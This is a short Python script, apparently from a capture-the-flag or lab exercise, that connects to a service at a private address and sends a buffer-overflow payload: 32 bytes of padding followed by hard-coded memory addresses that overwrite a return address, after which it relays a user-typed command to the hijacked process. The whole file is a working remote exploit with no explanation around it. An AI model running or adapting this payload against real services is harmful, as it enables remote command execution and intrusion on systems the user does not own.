import socket

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

mysock.connect(("192.168.1.85", 12345))

message = mysock.recv(1024)

print(message.decode())

padding = '\x00' * 32

message = padding.encode()

mysock.send(message + b'\x90\xea\xff\xff\xff\x7f\x00\x00\x17\x0b\x40\x00')

message = mysock.recv(1024)
print(message.decode())
message = mysock.recv(1024)
print(message.decode())

command = input("Enter Command: ")
mysock.send(command.encode())

message = mysock.recv(1024)
print(message.decode())

mysock.close()
